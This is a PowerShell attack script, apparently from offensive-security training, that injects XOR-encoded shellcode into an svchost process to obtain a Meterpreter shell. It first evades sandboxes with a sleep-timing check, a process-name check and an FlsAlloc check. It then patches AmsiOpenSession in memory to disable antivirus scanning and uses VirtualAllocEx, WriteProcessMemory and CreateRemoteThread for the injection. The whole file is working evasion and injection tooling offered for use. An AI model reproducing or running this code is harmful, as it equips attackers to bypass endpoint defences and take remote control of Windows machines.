function PrintSuccess {
  Param ($message)

  Write-Host "[+]", $message -ForegroundColor Green 
}

function PrintFail {
  Param ($message)

  Write-Host "[-]", $message -ForegroundColor Red
}

function PrintWarning {
  Param ($message)
  Write-Host "[!]", $message -ForegroundColor Yellow
}

function PrintInfo {
  Param ($message)

  Write-Host "[*]", $message -ForegroundColor Cyan
}

function LookupFunc {

Param ($moduleName, $functionName)

$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $tmp=@()
  $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

Param (
  [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
  [Parameter(Position = 1)] [Type] $delType = [Void]
)

$type = [AppDomain]::CurrentDomain.
  DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
    [System.MulticastDelegate])

$type.
  DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')

$type.
  DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')

return $type.CreateType()
}

$stime = [System.DateTime]::Now
Start-Sleep -Seconds 10
$etime = [System.DateTime]::Now.Subtract($stime).TotalSeconds

if ($etime -lt 10)
{
    return
}

# change this to meet the needs of the filename
$fileName = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
if ($fileName -ne "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\PowerShell_ISE.exe")
{
    return
}

$mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll FlsAlloc), (getDelegateType @([IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero)
if ($mem -eq $null)
{
    return
}

# use 32-bit shellcode for svchost.exe and 64-bit for svchost.exe (preferred)
$tgtProc = [System.Diagnostics.Process]::GetProcessesByName("svchost").Id

if ($null -eq $tgtProc)
{
  PrintWarning("Target process not found")
  PrintInfo("Starting target process")
  # change the executable path to match the target process
  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WinExec), (getDelegateType @([String], [int]) ([IntPtr]))).Invoke("C:\Windows\system32\svchost.exe",0) | Out-Null
}
 
# change target process to match above
$procId = [System.Diagnostics.Process]::GetProcessesByName("svchost").Id

if ($null -ne $procId)
{
  PrintInfo("Attempting bypass")
  [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
  $oldProtectionBuffer = 0
  $vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

  PrintWarning("Modifying memory protections")
  $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) | Out-Null
  $buf = [Byte[]] (0x48, 0x31, 0xC0)

  PrintSuccess("Bypassed")
  [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

  PrintWarning("Resetting memory protections")
  $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer) | Out-Null

  PrintWarning("Hooking PID:", $procId)
  $hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool],[UInt32]) ([IntPtr]))).Invoke(0x001F0FFF,$false,$procId)  
  
  PrintWarning("Allocating memory space")
  $addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr],[IntPtr], [UInt32],[UInt32],[UInt32]) ([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0x1000, 0x3000, 0x40)
  
  # insert xor encoded shellcode with key 0x3c
  [Byte[]] $buf = 0xc0,0xd4,0xb3,0x3c,0x3c,0x3c

  # change xor key as needed
  PrintInfo("Decrypting shellcode")
  for($i=0; $i -lt $buf.Length; $i++)
  {
    $buf[$i] = $buf[$i] -bxor 0x3c -band 0xff
  }

  PrintWarning("Writing evil buffer")
  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr],[IntPtr], [Byte[]],[UInt32],[UInt32].MakeByRefType()) ([Bool]))).Invoke($hprocess,$addr,$buf,$buf.Length, [Ref] 0) | Out-Null; 
  
  PrintWarning("Executing shellcode")
  $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr],[IntPtr], [UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero) | Out-Null;

  if ($hThread -eq 0)
  {
    PrintFail("Failed to execute shellcode!")
  }else{
    PrintSuccess("Meterpreter shell inbound")
}
}else {
  PrintFail("Unknown error... Maybe AV??")
}